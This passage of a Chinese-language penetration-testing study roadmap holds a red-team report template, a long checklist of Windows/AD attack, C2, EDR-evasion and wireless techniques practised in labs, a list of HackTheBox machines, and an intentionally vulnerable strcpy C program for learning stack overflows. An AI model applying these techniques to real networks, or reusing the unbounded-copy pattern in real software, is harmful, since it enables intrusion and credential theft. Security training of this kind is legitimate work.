方法：[secretsdump / pypykatz / 内存中的 Invoke-Mimikatz]
恢复的凭据：
  - administrator:NTLM_HASH_HERE
证据：[输出片段]
痕迹：[LSASS 的 Sysmon 10 / DCSync 的 4662]

## 第 6 步：部署 C2 植入体
框架：Sliver
监听器：[类型和端口]
植入体：[格式、使用的规避选项]
持久化：[使用的方法]
证据：[Sliver 会话截图或 sessions 输出]

## 第 7 步：通过 C2 枚举 AD
工具：从攻击机运行 BloodHound.py（目标上不留二进制）
发现：
  - Domain Admin 组成员：[列表]
  - 可 AS-REP Roast 的账户：[列表]
  - 可 Kerberoast 的 SPN：[列表]
  - ADCS 有漏洞的模板：[若存在则列出]
  - ACL 配置错误：[若存在则列出]

## 第 8 步：通往域管理员的路径
方法：[Kerberoasting / ADCS ESC1 / PtH / ACL 滥用]
命令：[确切命令]
结果：[DA 或同等访问权限]
证据：[DC 上的 whoami /groups 或 secretsdump 输出]

## 攻击路径图
攻击机 -> [初始利用] -> Victim-1 -> [提权] -> SYSTEM ->
  [凭据转储] -> [PtH 或 ADCS] -> DC（域管理员）

## OPSEC 评估
我生成了哪些痕迹：[列表]
什么本可以发现我：[列表]
我会怎么做得不同：[列表]
我利用了防守方的哪些盲区：[列表]
```

---

---

## 阶段 2 完成检查清单

在所有方框打勾之前，不要进入阶段 3。这些不是建议。

### 侦察与 OSINT
- [ ] 针对实验目标的被动侦察画像：子域、DNS 记录、证书、Shodan、GitHub
- [ ] theHarvester：识别出邮箱格式，构建了用户列表
- [ ] Wayback Machine：检查了 5 个历史 URL
- [ ] 构建并测试了 Google dork 集合（8 个以上可用 dork）
- [ ] Nmap：SYN 扫描、服务扫描、UDP 扫描、NSE 脚本：全部使用并理解
- [ ] Shodan 查询语法：运行 10 个以上查询，其中 3 个以上发现真实暴露的服务

### 服务漏洞利用
- [ ] 在 15 台以上 HackTheBox Easy 机器上拿到 root 并记录（含痕迹）
- [ ] SMB：空会话、nxc 枚举、EternalBlue 检查、PtH：全部测试
- [ ] SSH：密钥收集、审计、理解 agent 转发概念
- [ ] WinRM：用密码和哈希两种方式使用 evil-winrm：都已测试
- [ ] MSSQL：xp_cmdshell 执行、UNC 注入：都已演示
- [ ] RDP：连接、带 Restricted Admin 模式的 PtH 已测试
- [ ] Impacket 套件：知道每个工具做什么，记住凭据格式

### Linux 权限提升
- [ ] 通过 SUID 二进制拿到 root（5 个以上不同二进制，每个都有 GTFOBins 参考）
- [ ] 通过滥用 sudo 规则拿到 root（3 种以上技术）
- [ ] 通过 capabilities 拿到 root（cap_setuid 或等效）
- [ ] 通过可写 cron 任务或由 root 执行的可写脚本拿到 root
- [ ] 通过 NFS no_root_squash 拿到 root
- [ ] 在实验环境中测试内核漏洞利用（DirtyPipe 或 GameOver(lay)）
- [ ] LinPEAS 输出：能识别并优先处理红色发现
- [ ] 构建并测试了自定义 Linux 提权扫描器

### Windows 权限提升
- [ ] 通过 SeImpersonatePrivilege -> GodPotato 拿到 SYSTEM
- [ ] 通过未加引号的服务路径拿到 SYSTEM
- [ ] 通过弱服务权限（SERVICE_CHANGE_CONFIG）拿到 SYSTEM
- [ ] 通过 AlwaysInstallElevated（MSI 载荷）拿到 SYSTEM
- [ ] 通过 fodhelper 绕过 UAC：已测试，并能解释其原理
- [ ] 在实验环境中识别出 DLL 劫持（procmon）
- [ ] WinPEAS 输出：能识别关键发现
- [ ] 构建并测试了自定义 Windows 提权扫描器

### 凭据投毒与中继
- [ ] Responder：从实验机器捕获 NTLMv2 哈希
- [ ] 用 hashcat -m 5600 破解 NTLMv2 哈希
- [ ] NTLM 中继链：Responder + ntlmrelayx -> SAM 转储或 RCE
- [ ] SMB 签名：用 nxc 识别出未启用签名的机器
- [ ] mitm6：在实验环境中演示 DHCPv6 投毒
- [ ] 能解释 mitm6 为什么有效（IPv6 优先、DHCPv6 租约）
- [ ] 能解释每种技术会触发哪些事件 ID

### 后渗透与横向移动
- [ ] 转储 LSASS（ProcDump 方法）并用 pypykatz 解析
- [ ] 提取 SAM + SYSTEM 配置单元，用 secretsdump 恢复哈希
- [ ] 传递哈希：无需明文凭据即可横向移动
- [ ] 传递票据：窃取并复用 Kerberos 票据
- [ ] WMI 横向移动：成功使用 wmiexec
- [ ] BloodHound CE：已部署、已导入数据、识别出通往 DA 的攻击路径
- [ ] 执行并完整记录了三机横向移动链
- [ ] 基础持久化：计划任务 + 注册表 Run 键：都已测试并清理

### Active Directory 攻击
- [ ] net user/group /domain 命令：能不用工具枚举域
- [ ] rpcclient：enumdomusers、querygroupmem "Domain Admins"：都已演示
- [ ] ldapsearch：用户、计算机、可 AS-REP roast、可 Kerberoast：全部查询过
- [ ] enum4linux-ng：完整枚举，喷洒前读取密码策略
- [ ] AS-REP Roasting：捕获哈希并用 hashcat -m 18200 破解
- [ ] Kerberoasting：捕获 TGS 哈希并用 hashcat -m 13100 破解
- [ ] LAPS：从实验环境至少一台计算机读取 ms-McsAdmPwd 属性
- [ ] ACL 滥用：在实验环境中用 GenericAll 重置密码或加入组
- [ ] 影子凭据：在实验环境中成功执行 certipy shadow auto
- [ ] ADCS ESC1：certipy find 识别出有漏洞的模板，以 DA 身份申请了证书
- [ ] 约束委派：概念上理解，并在实验环境中尝试过

### AV/EDR 规避
- [ ] AMSI 绕过：记住并测试了一种可用方法
- [ ] ETW 补丁：测试了一种可用方法
- [ ] 在内存中加载 PowerShell 工具（PowerView 或 Rubeus），不写磁盘
- [ ] 用 Windows Defender 测试 msfvenom 载荷：理解它为什么会被标记
- [ ] 进程注入：在实验环境中编译并测试了经典注入 C 代码
- [ ] LOLBins：在实验环境中用 certutil 和 bitsadmin 传输文件
- [ ] 在实验环境中配置 Sysmon：在事件查看器中看到了自己的技术痕迹

### C2 框架
- [ ] 在攻击机上安装并运行 Sliver
- [ ] 创建 HTTPS 监听器
- [ ] 生成 Windows 植入体（exe 格式）
- [ ] 在受害机上执行植入体，在 Sliver 中建立会话
- [ ] 通过 Sliver 运行基础命令：whoami、hostname、ps、ls、download
- [ ] 通过 Sliver 会话配置 SOCKS5 代理
- [ ] 配置持久化机制（注册表或计划任务）
- [ ] 理解：Sliver 植入体回连时，在 Sysmon 中该找什么

### 网络跳板与隧道
- [ ] Ligolo-ng：通过已攻陷机器跳到第二个网段
- [ ] Ligolo-ng：添加路由并通过隧道运行 nmap 扫描
- [ ] Chisel：创建 SOCKS5 隧道，确认 proxychains 路由可用
- [ ] SSH 动态隧道：确认 proxychains 路由可用
- [ ] netsh portproxy：在 Windows 上创建规则并清理

### 无线攻击
- [ ] 在兼容网卡上启用监听模式
- [ ] 捕获 WPA2 握手（自己的实验网络或获授权的 AP）
- [ ] 用 hashcat -m 22000 破解握手
- [ ] 用 hcxdumptool 执行 PMKID 攻击
- [ ] WPA3 过渡模式：理解降级攻击概念

### 密码攻击
- [ ] 喷洒之前检查密码策略
- [ ] kerbrute：用户枚举 + 密码喷洒
- [ ] hashcat：NTLM、NTLMv2、Kerberos TGS、AS-REP：每种哈希都破解过
- [ ] 规则：best64 和 OneRuleToRuleThemAll：都应用并比较了输出
- [ ] 用 cewl 从目标网站构建了自定义字典

### 里程碑项目
- [ ] 里程碑 1：完整的渗透测试报告已撰写并自审
- [ ] 里程碑 2：Linux 提权扫描器：在测试目标上有可用输出
- [ ] 里程碑 2：Windows 提权扫描器：在测试目标上有可用输出
- [ ] 里程碑 3：启用 C2 的横向移动链已记录，含证据和 OPSEC 评估

---

---

## CTF 靶场与练习目标

| 平台 | 最适合 | 备注 |
|----------|----------|-------|
| [HackTheBox](https://www.hackthebox.com) | 阶段 2 全部内容 | Starting Point 免费且有引导。Pro Labs 用于 AD 模拟（Offshore、RastaLabs）。 |
| [TryHackMe](https://tryhackme.com) | 引导式技术练习 | 每一节都有现成房间。 |
| [VulnHub](https://www.vulnhub.com) | 离线实验机器 | 免费下载，在 VirtualBox 中运行。没有提示系统。 |
| [PentestLab](https://pentestlab.blog) | 特定技术深入 | 适合交叉对照。 |

**推荐的 HTB 机器（按顺序）：**

Linux 机器：
1. Lame：MS08-067，经典入门点
2. Bashed：简单的 Linux，练习方法论
3. Shocker：ShellShock，CGI 利用
4. Blocky：凭据复用
5. Mirai：默认凭据（现实世界最常见的路径）

Windows 机器：
1. Blue：EternalBlue MS17-010 永恒之蓝
2. Granny：WebDAV + IIS 利用
3. Devel：FTP + IIS 服务利用
4. Optimum：HTTP File Server CVE-2014-6287 漏洞
5. Bastard：Drupal -> Windows RCE 远程代码执行

Active Directory 机器：
1. Active：Kerberoasting（完美的第一台 AD 机器）
2. Forest：AS-REP roasting + DCSync 攻击
3. Resolute：撞库 + WinRM + 提权链
4. Monteverde：Azure AD Connect 凭据转储
5. Sauna：LDAP 匿名绑定 + AS-REP + DCSync
6. Return：打印机利用 + WinRM + AD
7. Escape：MSSQL + ADCS ESC1（完美对应 6.6.10 节）

---

---

## 阶段 2 到阶段 3 的衔接

阶段 3 是系统与内核漏洞利用。阶段 2 与阶段 3 之间的跨度很大。阶段 2 利用配置错误并使用现成工具。阶段 3 要求理解内存在指令层面如何工作、什么是栈帧，以及如何从零编写 shellcode。

**这个衔接是强制性的。** 大多数在阶段 3 放弃的人，都是因为跳过了它。

### 两周汇编基础模块（阶段 3 第 1 天之前完成）

```bash
# 第 1 周：汇编基础

# 安装 x86-64 汇编练习环境：
sudo apt install nasm gdb pwndbg
# pwndbg：https://github.com/pwndbg/pwndbg
# 安装：git clone https://github.com/pwndbg/pwndbg.git && cd pwndbg && ./setup.sh

# 编写并运行你的第一个汇编程序：
cat > hello.asm << 'EOF'
section .data
    msg db "Hello from asm", 10
    len equ $ - msg

section .text
    global _start

_start:
    ; write(1, msg, len)
    mov rax, 1          ; 系统调用号：sys_write
    mov rdi, 1          ; fd：标准输出
    mov rsi, msg        ; 指向消息的指针
    mov rdx, len        ; 消息长度
    syscall

    ; exit(0)
    mov rax, 60         ; 系统调用号：sys_exit
    xor rdi, rdi        ; 退出码：0
    syscall
EOF

# 汇编并链接：
nasm -f elf64 hello.asm -o hello.o
ld hello.o -o hello
./hello

# 用 pwndbg 调试：
gdb ./hello
pwndbg> break _start
pwndbg> run
pwndbg> step        # 单步执行一条指令
pwndbg> info registers    # 查看所有寄存器值
pwndbg> x/20xb $rsp       # 检查栈指针处的 20 个字节

# 第 2 周：理解栈

# 创建一个有漏洞的 C 程序：
cat > vuln.c << 'EOF'
#include <stdio.h>
#include <string.h>

void win() {
    printf("You got code execution!\n");
}

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);     // 没有边界检查：这里会溢出
    printf("Input: %s\n", buffer);
}

int main() {
    char input[256];
    fgets(input, 256, stdin);
    input[strcspn(input, "\n")] = 0;
    vulnerable(input);
    return 0;
}
EOF

# 关闭保护编译（仅供学习）：
gcc -o vuln vuln.c -fno-stack-protector -no-pie -z execstack -m64

# 检查启用了哪些保护：
checksec vuln
# 应显示：No RELRO、No canary、NX disabled、No PIE

# 带输入运行，观察它崩溃：
python3 -c "print('A'*80)" | ./vuln
# 段错误 = 你覆盖了返回地址：这就是阶段 3
```

**在阶段 3 第 1 天之前理解这些概念：**

```
栈基础：
  什么是栈：它在哪里、如何增长（向下）、上面有什么
  什么是栈帧：返回地址、保存的 RBP、局部变量
  为什么 input 大于缓冲区大小时 strcpy(buffer, input) 很危险
  'ret' 指令发生什么：从栈中弹出返回地址到 RIP

缓解机制：
  栈金丝雀：返回地址前的随机值，在 ret 前校验
  NX/DEP：不可执行栈，为什么会有 ret2libc 来绕过它
  ASLR：随机化基地址，为什么信息泄露很重要
  PIE：位置无关可执行文件，随机化代码基地址
  RELRO：只读重定位，保护 GOT

GDB 基础：
  break <function>：设置断点
  run：运行程序
  step / nexti：单步执行一条指令（step 跟进调用，nexti 不跟进）
  info registers：显示所有寄存器
  x/Nxb $rsp：以十六进制检查栈指针处的 N 个字节
  x/Ni $rip：反汇编当前指令指针处的 N 条指令
  backtrace：显示调用栈

阅读 GDB 输出：
  RAX/RBX/RCX/RDX：通用寄存器
  RSP：栈指针（栈顶）
  RBP：基址指针（当前栈帧底部）
  RIP：指令指针（当前指令）
```

**衔接阶段的资源（按顺序）：**

| 资源 | 类型 | 时长 | 费用 | 备注 |
|----------|------|----------|------|-------|
| 《The Art of Exploitation》（Jon Erickson 著） | 书 | 2 周 | 约 $40 | 至少读第 1-4 章。栈那一章是所有阶段 3 的基础。不可跳过。 |
| [pwn.college](https://pwn.college/) | 靶场 | 持续更新 | 免费 | 动手二进制利用。从“Program Security”模块开始。 |
| [picoCTF binary exploitation](https://picoctf.org/) | CTF | 5 小时 | 免费 | 如果一开始觉得 pwn.college 太难，这是更简单的起点。 |
| [x86-64 Linux Syscall Table](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) | 参考 | 1 小时 | 免费 | 写 shellcode 时你会不断用到它。 |
| [pwndbg Documentation](https://github.com/pwndbg/pwndbg) | 文档 | 2 小时 | 免费 | 有了 pwndbg，GDB 才真正好用。学习它的命令。 |

> 阶段 2 与阶段 3 之间的鸿沟，正是大多数人放弃的地方。他们没有栈基础就撞上阶段 3，然后停下来。上面的衔接会避免这一点。读 Erickson 的那几章。写出 hello.asm。搭好 pwndbg。在写下阶段 3 的第一行代码之前，先理解那个有漏洞的 C 程序。

---

<div align="right">

*阶段 2 完成。你现在对地球上大多数组织而言都是一个可信的威胁。*

*问题在于：你完成了清单上的每一项，还是跳过了那些不舒服的部分？清单不会说谎。*

*阶段 3 在等着。它更难。这是对的。*

</div>

---
